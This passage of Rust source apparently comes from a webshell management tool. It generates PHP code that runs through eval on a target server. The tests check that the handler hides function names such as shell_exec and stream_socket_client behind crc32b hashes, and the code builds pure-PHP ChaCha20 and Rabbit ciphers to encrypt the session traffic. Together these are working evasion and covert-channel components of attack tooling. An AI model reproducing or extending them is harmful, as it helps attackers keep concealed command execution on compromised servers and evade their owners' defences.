                assert!(!text.contains(token), "{name} 不应含明文 {token}");
            }
        }
        // 符号表里只应看到哈希
        for name in ["shell_exec", "scandir", "stream_socket_client", "fopen"] {
            assert!(
                handler.contains(&crc32b_hash(name)),
                "符号表应含 {name} 的 crc32b 哈希"
            );
        }
    }

    /// 处理器经 eval 执行：语法错误在目标端只表现为「响应中未找到协议帧」，
    /// 本地 `php -l` 比端到端失败便宜得多。
    #[test]
    fn session_handler_is_valid_php() {
        match std::process::Command::new("php").arg("-v").output() {
            Ok(output) if output.status.success() => output,
            _ => {
                eprintln!("跳过：未检测到 php 可执行文件");
                return;
            }
        };
        let dir = std::env::temp_dir().join(format!("dosword-lint-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("handler.php");
        std::fs::write(&path, format!("<?php\n{}\n", session_handler_code())).unwrap();
        let out = std::process::Command::new("php")
            .arg("-l")
            .arg(&path)
            .output()
            .expect("运行 php -l 失败");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            out.status.success(),
            "处理器不是合法 PHP：{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
    }
}

// ---------------------------------------------------------------------------
// CHACHA20（自实现现代流密码，RFC 8439，自加密会话形态）
// ---------------------------------------------------------------------------

/// ChaCha20 的 PHP 5+ 纯实现（64 位平台整数运算；32 位 PHP 位运算不可靠）。
/// 密钥 32 字节（= 密码 md5 的 hex ASCII），nonce 12 字节，counter 0=请求/1=响应。
fn chacha20_php_algo(prefix: &str) -> String {
    format!(
        r#"function {p}chacha($key, $nonce, $counter, $data) {{
    $cs = array(0x61707865, 0x3320646e, 0x79622d32, 0x6b206574);
    $out = '';
    $pos = 0;
    $len = strlen($data);
    while ($pos < $len) {{
        $st = $cs;
        for ($i = 0; $i < 8; $i++) {{
            $b = $i * 4;
            $st[] = (ord($key[$b]) | (ord($key[$b + 1]) << 8) | (ord($key[$b + 2]) << 16) | (ord($key[$b + 3]) << 24)) & 0xFFFFFFFF;
        }}
        $st[12] = ($counter + ($pos >> 6)) & 0xFFFFFFFF;
        $st[13] = (ord($nonce[0]) | (ord($nonce[1]) << 8) | (ord($nonce[2]) << 16) | (ord($nonce[3]) << 24)) & 0xFFFFFFFF;
        $st[14] = (ord($nonce[4]) | (ord($nonce[5]) << 8) | (ord($nonce[6]) << 16) | (ord($nonce[7]) << 24)) & 0xFFFFFFFF;
        $st[15] = (ord($nonce[8]) | (ord($nonce[9]) << 8) | (ord($nonce[10]) << 16) | (ord($nonce[11]) << 24)) & 0xFFFFFFFF;
        $ws = $st;
        for ($r = 0; $r < 10; $r++) {{
            {p}qr($ws, 0, 4, 8, 12);
            {p}qr($ws, 1, 5, 9, 13);
            {p}qr($ws, 2, 6, 10, 14);
            {p}qr($ws, 3, 7, 11, 15);
            {p}qr($ws, 0, 5, 10, 15);
            {p}qr($ws, 1, 6, 11, 12);
            {p}qr($ws, 2, 7, 8, 13);
            {p}qr($ws, 3, 4, 9, 14);
        }}
        $block = '';
        for ($i = 0; $i < 16; $i++) {{
            $w = ($ws[$i] + $st[$i]) & 0xFFFFFFFF;
            $block .= chr($w & 0xFF) . chr(($w >> 8) & 0xFF) . chr(($w >> 16) & 0xFF) . chr(($w >> 24) & 0xFF);
        }}
        $chunk = substr($data, $pos, 64);
        $out .= $chunk ^ substr($block, 0, strlen($chunk));
        $pos += 64;
    }}
    return $out;
}}
function {p}qr(&$st, $a, $b, $c, $d) {{
    $st[$a] = ($st[$a] + $st[$b]) & 0xFFFFFFFF;
    $st[$d] = $st[$d] ^ $st[$a];
    $st[$d] = (($st[$d] << 16) | ($st[$d] >> 16)) & 0xFFFFFFFF;
    $st[$c] = ($st[$c] + $st[$d]) & 0xFFFFFFFF;
    $st[$b] = $st[$b] ^ $st[$c];
    $st[$b] = (($st[$b] << 12) | ($st[$b] >> 20)) & 0xFFFFFFFF;
    $st[$a] = ($st[$a] + $st[$b]) & 0xFFFFFFFF;
    $st[$d] = $st[$d] ^ $st[$a];
    $st[$d] = (($st[$d] << 8) | ($st[$d] >> 24)) & 0xFFFFFFFF;
    $st[$c] = ($st[$c] + $st[$d]) & 0xFFFFFFFF;
    $st[$b] = $st[$b] ^ $st[$c];
    $st[$b] = (($st[$b] << 7) | ($st[$b] >> 25)) & 0xFFFFFFFF;
}}
"#,
        p = prefix
    )
}

/// Rabbit 的 PHP 5+ 纯实现（RFC 4503）。密钥 16 字节，IV 8 字节。
/// 请求密钥流偏移 0，响应偏移 64 字节。64 位平台精确（平方 < 2^64）。
fn rabbit_php_algo(prefix: &str) -> String {
    format!(
        r#"function {p}rabbit($key, $iv, $skip, $data) {{
    $k = array();
    for ($i = 0; $i < 8; $i++) {{
        $k[$i] = (ord($key[14 - 2 * $i]) << 8) | ord($key[15 - 2 * $i]);
    }}
    $x = array();
    $c = array();
    for ($j = 0; $j < 8; $j++) {{
        if (($j % 2) == 0) {{
            $x[$j] = (($k[($j + 1) % 8] << 16) | $k[$j]) & 0xFFFFFFFF;
            $c[$j] = (($k[($j + 4) % 8] << 16) | $k[($j + 5) % 8]) & 0xFFFFFFFF;
        }} else {{
            $x[$j] = (($k[($j + 5) % 8] << 16) | $k[($j + 4) % 8]) & 0xFFFFFFFF;
            $c[$j] = (($k[$j] << 16) | $k[($j + 1) % 8]) & 0xFFFFFFFF;
        }}
    }}
    $b = 0;
    $aa = array(0x4D34D34D, 0xD34D34D3, 0x34D34D34, 0x4D34D34D, 0xD34D34D3, 0x34D34D34, 0x4D34D34D, 0xD34D34D3);
    for ($r = 0; $r < 4; $r++) {{
        {p}rc($c, $aa, $b);
        {p}rx($x, $c);
    }}
    for ($j = 0; $j < 8; $j++) {{
        $c[$j] = ($c[$j] ^ $x[($j + 4) % 8]) & 0xFFFFFFFF;
    }}
    $iv0 = ((ord($iv[4]) << 24) | (ord($iv[5]) << 16) | (ord($iv[6]) << 8) | ord($iv[7])) & 0xFFFFFFFF;
    $iv1 = ((ord($iv[0]) << 24) | (ord($iv[1]) << 16) | (ord($iv[2]) << 8) | ord($iv[3])) & 0xFFFFFFFF;
    $mh = (($iv1 & 0xFFFF0000) | (($iv0 >> 16) & 0xFFFF)) & 0xFFFFFFFF;
    $ml = ((($iv1 & 0xFFFF) << 16) | ($iv0 & 0xFFFF)) & 0xFFFFFFFF;
    $c[0] = ($c[0] ^ $iv0) & 0xFFFFFFFF;
    $c[1] = ($c[1] ^ $mh) & 0xFFFFFFFF;
    $c[2] = ($c[2] ^ $iv1) & 0xFFFFFFFF;
    $c[3] = ($c[3] ^ $ml) & 0xFFFFFFFF;
    $c[4] = ($c[4] ^ $iv0) & 0xFFFFFFFF;
    $c[5] = ($c[5] ^ $mh) & 0xFFFFFFFF;
    $c[6] = ($c[6] ^ $iv1) & 0xFFFFFFFF;
    $c[7] = ($c[7] ^ $ml) & 0xFFFFFFFF;
    for ($r = 0; $r < 4; $r++) {{
        {p}rc($c, $aa, $b);
        {p}rx($x, $c);
    }}
    $ks = '';
    $need = $skip + strlen($data);
    while (strlen($ks) < $need) {{
        {p}rc($c, $aa, $b);
        {p}rx($x, $c);
        $w = array(
            ($x[0] & 0xFFFF) ^ ($x[5] >> 16),
            ($x[0] >> 16) ^ ($x[3] & 0xFFFF),
            ($x[2] & 0xFFFF) ^ ($x[7] >> 16),
            ($x[2] >> 16) ^ ($x[5] & 0xFFFF),
            ($x[4] & 0xFFFF) ^ ($x[1] >> 16),
            ($x[4] >> 16) ^ ($x[7] & 0xFFFF),
            ($x[6] & 0xFFFF) ^ ($x[3] >> 16),
            ($x[6] >> 16) ^ ($x[1] & 0xFFFF),
        );
        for ($i = 7; $i >= 0; $i--) {{
            $ks .= chr(($w[$i] >> 8) & 0xFF) . chr($w[$i] & 0xFF);
        }}
    }}
    $ks = substr($ks, $skip);
    return $data ^ $ks;
}}
function {p}rc(&$c, $aa, &$b) {{
    for ($j = 0; $j < 8; $j++) {{
        $t = $c[$j] + $aa[$j] + $b;
        $b = ($t >> 32) & 0xFFFFFFFF;
        $c[$j] = $t & 0xFFFFFFFF;
    }}
}}
function {p}rx(&$x, $c) {{
    $g = array();
    for ($j = 0; $j < 8; $j++) {{
        $s = ($x[$j] + $c[$j]) & 0xFFFFFFFF;
        // 32 位拆分平方：$s^2 可能超过 2^63（PHP int 上限）转 float 丢精度，
        // 拆 16 位块计算低/高 32 位，全程 ≤ 2^33 精确
        $a = $s & 0xFFFF;
        $b16 = ($s >> 16) & 0xFFFF;
        $a2 = $a * $a;
        $ab2 = 2 * $a * $b16;
        $b2 = $b16 * $b16;
        $lsw = ($a2 + (($ab2 & 0xFFFF) << 16)) & 0xFFFFFFFF;
        $carry1 = (($a2 >> 16) + ($ab2 & 0xFFFF)) >> 16;
        $mid1 = ($ab2 >> 16) + ($b2 & 0xFFFF) + $carry1;
        $carry2 = $mid1 >> 16;
        $high = ($b2 >> 16) + $carry2;
        $msw = (($mid1 & 0xFFFF) | (($high & 0xFFFF) << 16)) & 0xFFFFFFFF;
        $g[$j] = $lsw ^ $msw;
    }}
    $g0 = $g[0]; $g1 = $g[1]; $g2 = $g[2]; $g3 = $g[3];
    $g4 = $g[4]; $g5 = $g[5]; $g6 = $g[6]; $g7 = $g[7];
    $x[0] = ($g0 + (($g7 << 16) | ($g7 >> 16)) + (($g6 << 16) | ($g6 >> 16))) & 0xFFFFFFFF;
    $x[1] = ($g1 + (($g0 << 8) | ($g0 >> 24)) + $g7) & 0xFFFFFFFF;
    $x[2] = ($g2 + (($g1 << 16) | ($g1 >> 16)) + (($g0 << 16) | ($g0 >> 16))) & 0xFFFFFFFF;
    $x[3] = ($g3 + (($g2 << 8) | ($g2 >> 24)) + $g1) & 0xFFFFFFFF;
    $x[4] = ($g4 + (($g3 << 16) | ($g3 >> 16)) + (($g2 << 16) | ($g2 >> 16))) & 0xFFFFFFFF;
    $x[5] = ($g5 + (($g4 << 8) | ($g4 >> 24)) + $g3) & 0xFFFFFFFF;
    $x[6] = ($g6 + (($g5 << 16) | ($g5 >> 16)) + (($g4 << 16) | ($g4 >> 16))) & 0xFFFFFFFF;
    $x[7] = ($g7 + (($g6 << 8) | ($g6 >> 24)) + $g5) & 0xFFFFFFFF;
}}
"#,
        p = prefix
    )
}
